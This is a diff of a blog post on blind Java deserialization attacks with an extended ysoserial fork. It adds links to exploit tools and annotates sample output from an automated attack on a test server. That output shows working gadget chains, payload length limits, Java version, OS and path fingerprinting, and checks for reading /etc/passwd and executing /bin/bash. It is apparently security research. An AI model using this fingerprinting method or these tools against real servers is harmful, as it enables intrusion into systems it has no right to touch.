@@ -234,6 +234,16 @@ The security problem is fixed in v3.2.2 and v4.1.
 * Private key extraction from web servers & containers.
 * Implementation of DoS payloads.
 
+## Resources:
+
+* [Part 1] of our blog post
+* [Deserialize test server]
+* [extended ysoserial] with blind attacks implemented, victim fingerprinting
+* [ysoserial] the original one
+* [Java-Deserialization-Cheat-Sheet]
+* [Understanding ysoserial's CommonsCollections1 exploit]
+* [What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability]
+
 ## Demo {#demo}
 
 0. Clone [Deserialize test server] and [extended ysoserial].
@@ -248,13 +258,14 @@ The attack is launched against the test server and produces the report as below.
 The [Attack.java] runs an automated test against the victim to determine few interesting properties:
 
 ```
-// Testing CommonsCollections - Transformer based, v3
+# Testing CommonsCollections - Transformer based, v3
 Sleep Commons01 worked: true
 Sleep Commons05 worked: true
 Sleep Commons06 worked: true
 
-// Testing javassist exploit classes
-// cc = CommonsCollections. cc2, cc4 uses v4 lib
+# Testing javassist exploit classes
+# Accepting the raw Java code as payload body.
+# cc = CommonsCollections. cc2, cc4 uses v4 lib
 Javassist[       cb1] worked: false
 Javassist[       cc2] worked: false
 Javassist[       cc3] worked: true
@@ -269,8 +280,8 @@ Javassist[      rome] worked: false
 Javassist[   spring1] worked: false
 Javassist[   spring2] worked: false
 
-// Testing maximum length of the request
-// server accepts
+# Testing maximum length of the payload
+# server accepts
 Length limit 1k passed: true
 Length limit 4k passed: true
 Length limit 16k passed: true
@@ -278,14 +289,17 @@ Length limit 256k passed: true
 Exception in post Req
 Length limit 1M passed: false
 
+# Major java version running the app
 Java 4 version: true
 Java 5 version: true
 Java 6 version: true
 Java 7 version: true
 Java 8 version: true
 
+# Security manager active?
 Security manager == null? true
 
+# os.name fingerprinting
 OS: win: false
 OS: mac: true
 OS: darwin: false
@@ -293,12 +307,15 @@ OS: nux: false
 OS: sun: false
 OS: bsd: false
 
+# Path on which ping resides
 OS: /bin/ping false
 OS: /sbin/ping true
 OS: /usr/bin/ping false
 OS: /usr/sbin/ping false
 OS: /usr/local/bin/ping false
 
+# Security manager checks &
+# read, write, exec checks
 Can connect to google.com:80: true
 Can exec /bin/bash: true
 Can read /etc/passwd: true
@@ -407,4 +424,7 @@ Extracted string: Mac OS X
 [GeneratorTest.java]: https://github.com/yolosec/ysoserial/blob/master/src/test/java/ysoserial/blind/GeneratorTest.java
 [AttackTest.java]: https://github.com/yolosec/ysoserial/blob/master/src/test/java/ysoserial/blind/AttackTest.java
 [Affected versions]: https://commons.apache.org/proper/commons-collections/security-reports.html#Apache_Commons_Collections_Security_Vulnerabilities
+[Java-Deserialization-Cheat-Sheet]: https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
+[Understanding ysoserial's CommonsCollections1 exploit]: http://gursevkalra.blogspot.cz/2016/01/ysoserial-commonscollections1-exploit.html
+[What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability]: https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#exploitdev
 
